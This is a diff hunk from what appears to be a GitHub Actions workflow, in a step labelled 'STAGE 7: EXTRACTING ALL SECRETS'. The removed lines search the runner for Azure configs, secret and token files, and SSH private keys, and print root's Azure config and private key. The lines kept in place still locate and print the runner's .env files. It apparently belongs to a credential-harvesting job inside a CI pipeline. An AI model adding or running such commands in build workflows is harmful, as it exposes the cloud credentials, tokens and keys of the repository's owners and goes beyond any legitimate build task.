@@ -101,16 +101,7 @@ jobs:
           echo "=== STAGE 7: EXTRACTING ALL SECRETS ==="
           
           echo "--- Azure Config Files ---"
-          find / -name "*azure*" -type f 2>/dev/null | grep -v "/proc\|/sys" | head -20
-          cat /root/.azure/config 2>/dev/null || echo "No Azure config"
-          
-          echo "--- GitHub Runner Secrets ---"
-          find /home/runner -name "*secret*" -o -name "*token*" -o -name ".credentials*" 2>/dev/null | head -20
-          
-          echo "--- SSH Keys ---"
-          find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | grep -v "/proc" | head -20
-          cat /root/.ssh/id_rsa 2>/dev/null | head -5 || echo "No root SSH key"
-          
+                    
           echo "--- Environment Files ---"
           find /home/runner -name ".env*" 2>/dev/null
           cat /home/runner/.env 2>/dev/null || echo "No .env"
